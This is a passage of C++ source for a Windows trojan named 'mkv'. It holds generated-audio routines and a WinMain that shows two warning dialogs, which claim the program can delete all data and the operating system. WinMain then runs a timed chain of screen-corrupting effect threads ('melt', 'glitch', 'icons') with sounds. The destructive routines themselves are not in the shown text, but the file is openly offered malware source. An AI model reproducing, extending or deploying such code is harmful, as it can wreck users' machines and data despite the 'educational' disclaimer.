	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(((t * 3 | t >> 4 | 12) + (43 & t >> 10 + 2) * 8 ^ 999) - (4 + t & 39 ? 42 : 2));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound9() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t / 250 * 2) * (tan(t >> 9)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

VOID WINAPI sound10() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t & t >> 4 * t >> 3 | t >> 4);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
	if (MessageBoxW(NULL, L"Warning! You have ran a trojan known as mkv that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it's highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?", L"mkv", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
		ExitProcess(0);
	} 
	else {
		if (MessageBoxW(NULL, L"Final warning! This trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution.", L"mkv", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
			ExitProcess(0);
		}
		else {
			Sleep(5000);
			HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
			HANDLE thread1dot1 = CreateThread(0, 0, hexagon, 0, 0, 0);
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
			HANDLE thread2dot1 = CreateThread(0, 0, piez, 0, 0, 0);
			sound2();
			Sleep(30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread3 = CreateThread(0, 0, abomination, 0, 0, 0);
			HANDLE thread3dot1 = CreateThread(0, 0, melt, 0, 0, 0);
			sound3();
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			TerminateThread(thread3dot1, 0);
			CloseHandle(thread3dot1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread4 = CreateThread(0, 0, shader3, 0, 0, 0);
			sound4();
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread5 = CreateThread(0, 0, shader4, 0, 0, 0);
			HANDLE thread5dot1 = CreateThread(0, 0, icons, 0, 0, 0);
			sound5();
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			TerminateThread(thread1dot1, 0);
			CloseHandle(thread1dot1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread6 = CreateThread(0, 0, glitch, 0, 0, 0);
			HANDLE thread6dot1 = CreateThread(0, 0, triangle, 0, 0, 0);
			sound6();
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread7 = CreateThread(0, 0, shader5, 0, 0, 0);
			sound7();
			Sleep(30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			TerminateThread(thread2dot1, 0);
			CloseHandle(thread2dot1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread8 = CreateThread(0, 0, kirurg, 0, 0, 0);
			HANDLE thread8dot1 = CreateThread(0, 0, missingtexture, 0, 0, 0);
			sound8();
			Sleep(30000);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread9 = CreateThread(0, 0, shader6, 0, 0, 0);
			HANDLE thread9dot1 = CreateThread(0, 0, textout, 0, 0, 0);
			sound9();
			Sleep(30000);
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE thread10 = CreateThread(0, 0, shader7, 0, 0, 0);
			sound10();
			Sleep(30000);
		}
	}
}